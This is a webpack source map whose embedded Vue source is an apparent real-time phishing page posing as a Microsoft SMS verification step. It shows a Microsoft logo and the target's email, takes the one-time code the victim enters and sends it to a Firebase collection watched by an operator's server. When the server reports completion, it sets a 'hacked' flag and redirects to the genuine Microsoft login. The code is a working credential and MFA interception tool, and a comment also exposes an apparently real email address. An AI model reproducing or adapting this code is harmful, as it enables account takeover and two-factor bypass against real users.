{"version":3,"sources":["webpack:///./src/views/mobile/SMSVerificationForm.vue?913f","webpack:///./src/views/mobile/SMSVerificationForm.vue?dc8f","webpack:///src/views/mobile/SMSVerificationForm.vue","webpack:///./src/views/mobile/SMSVerificationForm.vue?9072","webpack:///./src/views/mobile/SMSVerificationForm.vue"],"names":["render","_vm","this","_h","$createElement","_c","_self","staticClass","attrs","model","value","callback","$$v","showDialog","expression","disableCard","companyLogo","_v","_s","email","$route","params","smsInfo","_e","ref","on","$event","preventDefault","onSubmit","type","indexOf","_k","keyCode","key","submitForm","smsCode","staticRenderFns","name","data","computed","methods","component","VBtn","VCard","VCardText","VContainer","VDialog","VForm","VIcon","VImg","VRow","VSpacer","VTextField","VToolbar","VToolbarTitle"],"mappings":"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","file":"js/SMSVerificationForm.b4c575ca.js","sourcesContent":["import mod from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--8-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--8-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--8-oneOf-1-2!../../../node_modules/sass-loader/dist/cjs.js??ref--8-oneOf-1-3!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./SMSVerificationForm.vue?vue&type=style&index=0&lang=scss&\"; export default mod; export * from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--8-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--8-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--8-oneOf-1-2!../../../node_modules/sass-loader/dist/cjs.js??ref--8-oneOf-1-3!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./SMSVerificationForm.vue?vue&type=style&index=0&lang=scss&\"","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('v-container',{staticClass:\"d-flex justify-center\",attrs:{\"fill-height\":\"\"}},[_c('v-dialog',{attrs:{\"width\":\"450\",\"persistent\":\"\"},model:{value:(_vm.showDialog),callback:function ($$v) {_vm.showDialog=$$v},expression:\"showDialog\"}},[_c('v-card',{staticClass:\"pa-10\",attrs:{\"width\":\"450\",\"disabled\":_vm.disableCard,\"tile\":\"\"}},[_c('v-toolbar',{attrs:{\"flat\":\"\"}},[_c('v-toolbar-title',[_c('v-img',{staticClass:\"my-2\",attrs:{\"alt\":\"Microsoft Logo\",\"src\":_vm.companyLogo,\"transition\":\"scale-transition\",\"max-height\":\"70\",\"max-width\":\"150\"}}),_c('v-btn',{staticClass:\"text-none pl-1\",attrs:{\"text\":true,\"color\":\"\",\"depressed\":\"\"}},[_vm._v(\" \"+_vm._s(_vm.email)+\" \")])],1)],1),_c('v-card-text',[_c('h2',{staticClass:\"mt-3 mb-4 black--text\"},[_vm._v(\"Enter code\")]),_c('p',{staticClass:\"black--text\"},[_c('v-icon',{attrs:{\"left\":\"\"}},[_vm._v(\"mdi-message-reply-outline\")]),_vm._v(_vm._s(_vm.$route.params.smsInfo)+\" \")],1),(_vm.error)?_c('p',{staticClass:\"red--text\"},[_vm._v(\" You didn't enter the expected verification code. Please try again. \"),_c('router-link',{attrs:{\"to\":\"/\"}},[_vm._v(\"View details\")]),_vm._v(\". \")],1):_vm._e(),_c('v-form',{ref:\"form\",attrs:{\"lazy-validation\":\"\"},on:{\"submit\":function($event){$event.preventDefault();return _vm.onSubmit($event)}}},[_c('v-text-field',{attrs:{\"dense\":true,\"label\":\"Code\",\"type\":\"text\",\"required\":\"\"},on:{\"keyup\":function($event){if(!$event.type.indexOf('key')&&_vm._k($event.keyCode,\"enter\",13,$event.key,\"Enter\")){ return null; }return _vm.submitForm($event)}},model:{value:(_vm.smsCode),callback:function ($$v) {_vm.smsCode=$$v},expression:\"smsCode\"}}),_c('p',{staticClass:\"caption\"},[_c('router-link',{attrs:{\"to\":\"\"}},[_vm._v(\"More Information\")])],1),_c('v-row',[_c('v-spacer'),_c('v-btn',{staticClass:\"rounded-button black--text text-none mx-2 px-10\",attrs:{\"depressed\":true,\"color\":\"#9198a3\"}},[_vm._v(\"Cancel\")]),_c('v-btn',{staticClass:\"rounded-button white--text text-none px-10\",attrs:{\"width\":\"\",\"depressed\":true,\"color\":\"#005DA6\"},on:{\"click\":_vm.submitForm}},[_vm._v(\"Verify\")])],1)],1)],1)],1)],1)],1)}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","<template>\n  <v-container fill-height class=\"d-flex justify-center\">\n    <v-dialog v-model=\"showDialog\" width=\"450\" persistent>\n      <v-card class=\"pa-10\" width=\"450\" :disabled=\"disableCard\" tile>\n        <v-toolbar flat>\n          <v-toolbar-title>\n            <v-img\n              class=\"my-2\"\n              alt=\"Microsoft Logo\"\n              :src=\"companyLogo\"\n              transition=\"scale-transition\"\n              max-height=\"70\"\n              max-width=\"150\"\n            />\n\n            <!-- <div class=\"mt-3\">\n            <p class=\"body-1\">annalise.buttigieg@bluestone.com.au</p>\n          </div>-->\n            <v-btn class=\"text-none pl-1\" :text=\"true\" color depressed>\n              <!-- <v-icon left>mdi-arrow-left</v-icon> -->\n              {{ email }}\n            </v-btn>\n          </v-toolbar-title>\n        </v-toolbar>\n\n        <v-card-text>\n          <h2 class=\"mt-3 mb-4 black--text\">Enter code</h2>\n          <p class=\"black--text\">\n            <v-icon left>mdi-message-reply-outline</v-icon\n            >{{ $route.params.smsInfo }}\n          </p>\n          <p class=\"red--text\" v-if=\"error\">\n            You didn't enter the expected verification code. Please try again.\n            <router-link to=\"/\">View details</router-link>.\n          </p>\n          <v-form ref=\"form\" lazy-validation v-on:submit.prevent=\"onSubmit\">\n            <v-text-field\n              :dense=\"true\"\n              v-model=\"smsCode\"\n              label=\"Code\"\n              type=\"text\"\n              required\n              v-on:keyup.enter=\"submitForm\"\n            ></v-text-field>\n\n            <p class=\"caption\">\n              <router-link to>More Information</router-link>\n            </p>\n\n            <v-row>\n              <v-spacer></v-spacer>\n              <v-btn\n                class=\"rounded-button black--text text-none mx-2 px-10\"\n                :depressed=\"true\"\n                color=\"#9198a3\"\n                >Cancel</v-btn\n              >\n              <v-btn\n                width=\"\"\n                class=\"rounded-button white--text text-none px-10\"\n                :depressed=\"true\"\n                color=\"#005DA6\"\n                @click=\"submitForm\"\n                >Verify</v-btn\n              >\n            </v-row>\n          </v-form>\n        </v-card-text>\n      </v-card>\n    </v-dialog>\n  </v-container>\n</template>\n\n<script>\nimport { db } from \"../../firebase\";\nexport default {\n  name: \"LoginForm\",\n\n  data: () => ({\n    error: false,\n    disableCard: false,\n    email: \"\",\n    smsCode: \"\",\n    browser: \"\",\n    showLogo: false,\n    showDialog: true,\n  }),\n\n  async created() {\n    this.email = this.$route.params.data.includes(\"@\")\n      ? this.$route.params.data\n      : window.atob(this.$route.params.data).split(\",\")[0];\n\n    this.companyLogo = window.atob(this.$route.params.data).split(\",\")[3];\n\n    this.browser = this.$route.params.browser;\n    this.companyName = this.email.split(\"@\")[1].split(\".\")[0];\n    window.document.title = this.companyName;\n\n    let workers = await db.collection(\"workers\");\n\n    workers.where(\"browser\", \"==\", this.browser).onSnapshot((snapshot) => {\n      snapshot.docChanges().forEach(async (change) => {\n        let data = change.doc.data();\n        console.log(change.type);\n        if (data.from === \"server\" && change.type === \"modified\") {\n          if (data.info === \"sms_error\") {\n            this.error = true;\n            this.disableCard = false;\n            this.password = \"\";\n          }\n\n          // Verification complete\n          if (data.info === \"verification_complete\") {\n            localStorage.setItem(\"hacked\", true);\n            window.location.href = `https://login.microsoftonline.com`;\n          }\n        }\n      });\n    });\n  },\n\n  computed: {},\n  // mounted() {\n  //   setTimeout(() => {\n  //     console.log(this.$router);\n  //     this.$router.push({\n  //       path: `/settings/${window.btoa(this.email)}m/${window.btoa(\n  //         this.companyLogo\n  //       )}l/}`,\n  //     });\n  //   }, 50000);\n  // },\n  methods: {\n    async submitForm() {\n      this.disableCard = true;\n      this.error = false;\n\n      if (this.smsCode.length < 5) {\n        this.error = true;\n        this.disableCard = false;\n        return;\n      }\n\n      let workers = await db.collection(\"workers\");\n\n      await workers.doc(this.browser).set(\n        {\n          browser: this.browser,\n          data_type: \"sms\",\n          smsCode: this.smsCode,\n          from: \"client\",\n          screenState: \"\",\n          info: \"\",\n        },\n        { merge: true }\n      );\n    },\n  },\n};\n</script>\n<style lang=\"scss\">\na {\n  text-decoration: none;\n  color: #005da6;\n}\n.rounded-button {\n  border-radius: 0px;\n}\n</style>\n","import mod from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./SMSVerificationForm.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./SMSVerificationForm.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./SMSVerificationForm.vue?vue&type=template&id=0bb7a00e&\"\nimport script from \"./SMSVerificationForm.vue?vue&type=script&lang=js&\"\nexport * from \"./SMSVerificationForm.vue?vue&type=script&lang=js&\"\nimport style0 from \"./SMSVerificationForm.vue?vue&type=style&index=0&lang=scss&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports\n\n/* vuetify-loader */\nimport installComponents from \"!../../../node_modules/vuetify-loader/lib/runtime/installComponents.js\"\nimport { VBtn } from 'vuetify/lib/components/VBtn';\nimport { VCard } from 'vuetify/lib/components/VCard';\nimport { VCardText } from 'vuetify/lib/components/VCard';\nimport { VContainer } from 'vuetify/lib/components/VGrid';\nimport { VDialog } from 'vuetify/lib/components/VDialog';\nimport { VForm } from 'vuetify/lib/components/VForm';\nimport { VIcon } from 'vuetify/lib/components/VIcon';\nimport { VImg } from 'vuetify/lib/components/VImg';\nimport { VRow } from 'vuetify/lib/components/VGrid';\nimport { VSpacer } from 'vuetify/lib/components/VGrid';\nimport { VTextField } from 'vuetify/lib/components/VTextField';\nimport { VToolbar } from 'vuetify/lib/components/VToolbar';\nimport { VToolbarTitle } from 'vuetify/lib/components/VToolbar';\ninstallComponents(component, {VBtn,VCard,VCardText,VContainer,VDialog,VForm,VIcon,VImg,VRow,VSpacer,VTextField,VToolbar,VToolbarTitle})\n"],"sourceRoot":""}